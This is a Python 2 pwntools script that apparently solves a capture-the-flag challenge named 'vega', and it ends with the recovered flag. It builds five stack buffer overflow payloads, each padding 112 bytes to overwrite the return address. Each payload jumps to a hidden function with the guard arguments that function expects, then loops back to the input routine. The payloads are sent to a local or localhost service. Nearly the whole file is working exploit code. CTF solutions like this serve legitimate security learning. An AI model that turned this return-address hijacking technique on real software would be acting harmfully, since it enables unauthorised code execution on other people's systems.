#!/usr/bin/python2
from pwn import *
import os

# Relevent Addresses
_           = 0x08048536 # 0x804851b   # Getting input
never       = 0x08048576 # 0x804855b
gonna       = 0x080485f9 # 0x80485de
give        = 0x08048714 # 0x80486d7
you         = 0x080487fc # 0x80487ae
up          = 0x08048934 # 0x80488d5

# Relevant Guards
gonna_can = 0x12345678
give_can  = 0x6defcab6
give_can2 = 0xabcddcba
c1        = 0x1111114b
c2        = 0x1111114a
c3        = 0x11111152
c4        = 0x1111114a
ch1       = 0xffffff2e
ch2       = 0xffffff60
ch3       = 0xffffff2c
ch4       = 0xffffff70
ch5       = 0xffffff5c
ch6       = 0xffffff6c
ch7       = 0xffffff5d

# Building the payloads
dist_eip = 112 # 112 bytes to EIP overwrite in _
payA = 'A' * dist_eip + p32(never) + p32(_)
payB = 'B' * dist_eip + p32(gonna) + p32(_) + p32(gonna_can)
payC = 'C' * dist_eip + p32(give)  + p32(_) + p32(give_can) + p32(give_can2)
payD = 'D' * dist_eip + p32(you)   + p32(_) + p32(c1) + p32(c2) + p32(c3) + p32(c4)
payE = 'E' * dist_eip + p32(up)    + p32(_) + p32(ch1) + p32(ch2) + p32(ch3) + p32(ch4) + p32(ch5) + p32(ch6) + p32(ch7)

# DEBUG
#f = open('testpayload','wb')
#f.write(payB)
#f.close()

# Send the attacks
local = False
debug = False
if local:
    if debug:
        p = gdb.debug('./vega', '''
            break *0x0804856b
            break *0x080485f9
            break *0x08048536
            continue
            ''')
        #0x08048536 main
        #0x0804856b first read
        #0x080485f9 gonna
    else:
        p = process('./vega')
else:
    p = remote('localhost', 5000)

#p.interactive()
p.recvuntil("overlord.\n")
p.sendline(payA)
p.recvuntil("overlord.\n")
#print p.recv()
p.sendline(payB)
p.recvuntil("overlord.\n")
#print(p.recv())
#sleep(20)
p.sendline(payC)
#p.interactive()
p.recvuntil("overlord.\n")

#print p.recv()
p.sendline(payD)
#p.interactive()
#print p.recv()
p.sendline(payE)
p.interactive()
#print p.recv()
#p.interactive()
#flag{Y3ll0WK3Y_Gr33NK3Y_Blu3K3Y_Purpl3K3Y!}